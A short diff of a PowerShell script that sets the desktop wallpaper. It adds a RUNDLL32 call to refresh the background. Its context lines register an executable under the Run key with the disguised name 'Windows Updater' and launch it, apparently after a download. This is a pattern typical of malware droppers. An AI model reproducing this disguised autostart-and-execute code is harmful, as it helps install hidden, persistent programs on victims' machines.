@@ -18,6 +18,9 @@ $webClient.Dispose()
 Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $bgPath
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Updater' -Value $exePath
 
+# Update the background
+Start-Process RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
 # Run the binary
 Start-Process $exePath
 
